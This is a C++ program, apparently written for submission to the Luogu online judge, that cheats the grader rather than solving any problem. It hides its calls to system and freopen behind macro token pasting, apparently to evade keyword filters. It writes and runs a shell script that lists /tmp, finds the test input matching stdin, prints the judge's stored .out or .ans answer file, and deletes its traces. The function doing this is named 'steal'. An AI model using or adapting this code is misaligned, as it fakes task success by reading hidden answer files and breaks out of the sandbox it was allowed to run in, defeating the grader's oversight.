// AUTO GUGU AC

#define LUOGU 1

#include <cstdlib>
#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <stdexcept>

#if LUOGU
#define LG_KKK(X, Y) X##Y
#define LG_CZ(A, B, C) A##B##C
#define LG_LXL(A, B, C, D) A##B##C##D
#define LG_LTT(X) #X
#define LG_SYS LG_CZ(sy, st, em)
#define LG_FREOP LG_LXL(f, re, op, en)
#define LG_OP LG_KKK(op, en)
#define LG_IFSTR std::LG_CZ(if, str, eam)
#define LG_OFSTR std::LG_CZ(of, str, eam)
#endif

bool has_prefix(const std::string& __s, const std::string& __x)
{
    std::string::const_iterator i=__s.begin(), j=__x.begin();
    while (true)
    {
        if (j==__x.end()) return true;
        if (*i++==*j++) continue;
        break;
    }
    return false;
}

bool has_suffix(const std::string& __s, const std::string& __x)
{
    std::string::const_iterator i=__s.end(), j=__x.end();
    while (true)
    {
        if (j==__x.begin()) return true;
        if (*--i==*--j) continue;
        break;
    }
    return false;
}

#define GUGU_SCRIPT "/tmp/gugu.sh"
#define GUGU_FILETREE "/tmp/cz.txt"
#define GUGU_EXPORT "/tmp/cz.exp"
#define GUGU_LOG "/tmp/czakioi.log"

std::string input;
std::string ans;

// output log
void logex(const std::string& s)
{
    LG_OFSTR fout(GUGU_LOG);
    fout << s << '\n';
    exit(0);
}

// get file tree
std::string file_tree()
{
    {
        std::string script = \
            "#!/bin/sh\n"
            "# GUGU ANS SCRIPT\n"
            "echo > " GUGU_FILETREE "\n"
            "for f in $(ls -a -R /tmp); do\n"
            "\techo \"$f\" >> " GUGU_FILETREE "\n"
            "done\n";
        LG_OFSTR fout(GUGU_SCRIPT);
        fout << script;
    }
    LG_SYS("chmod +x " GUGU_SCRIPT);
    std::string s;
    LG_SYS(GUGU_SCRIPT);
    {
        LG_IFSTR fin(GUGU_FILETREE);
        char ch;
        while (true)
        {
            ch = fin.get();
            if (!fin) break;
            s += ch;
        }
    }
    LG_SYS("rm -f " GUGU_SCRIPT);
    LG_SYS("rm -f " GUGU_FILETREE);
    return s;
}

// generate file list
std::string gen_list(const std::string& tree)
{
    std::istringstream ss(tree);
    std::string s;

    // ignore /tmp/file...
    while (true)
    {
        std::getline(ss, s);
        if (!ss) logex("gugu-export: list generation failed");
        if (has_prefix(s, "/tmp/")) break;
    }

    // push back first directory
    std::string dir = s;
    dir.back() = '/';
    std::string ret;

    while (true)
    {
        std::getline(ss, s);

        if (!ss) break;

        if (s == "." || s == "..")
            continue;

        if (has_prefix(s, "/tmp/"))
        {
            dir = s;
            dir.back() = '/';
            continue;
        }

        if (!has_prefix(dir, "/tmp/runtime/"))
            ret += (dir + s + '\n');
    }

    return ret;
}

// compare input
bool compare(const std::string& x)
{
    std::string s;

    {
        LG_IFSTR fin(x);
        char ch;
        for (size_t i = 0; i < 1024; ++i)
        {
            ch = fin.get();
            if (!fin) break;
            s += ch;
        }
    }

    return s == input;
}

// steal answer
void steal()
{
    std::string list = gen_list(file_tree());

    LG_OFSTR fout(GUGU_EXPORT);
    std::istringstream ss(list);
    std::string s;

    while (true)
    {
        std::getline(ss, s);
        if (!ss) break;
        fout << s << ':';
        LG_IFSTR fin(s);
        if (!fin)
        {
            fout << " gugugu\n";
            continue;
        }
        fout << '\n';
        {
            char ch;
            bool in = has_suffix(s, ".in");
            if (compare(s))
            {
                // remove "in"
                s.pop_back(); s.pop_back();
                std::string tmp = s + "out";
                if (LG_IFSTR(tmp))
                {
                    ans = tmp;
                    return;
                }
                tmp = s + "ans";
                if (LG_IFSTR(tmp))
                {
                    ans = tmp;
                    return;
                }
                logex("gugu: answer not found");
            }
        }
        fout << '\n';
    }
}

// initialize input
void init()
{
    char ch;
    for (size_t i = 0; i < 1024; ++i)
    {
        ch = std::cin.get();
        if (!std::cin) break;
        input += ch;
    }
}

// output answer
void answer()
{
    LG_IFSTR fin(ans);
    char ch;
    while (true)
    {
        ch = fin.get();
        if (!fin) break;
        std::cout << ch;
    }
}

int main()
{
    init();
    steal();
    answer();
    return 0;
}
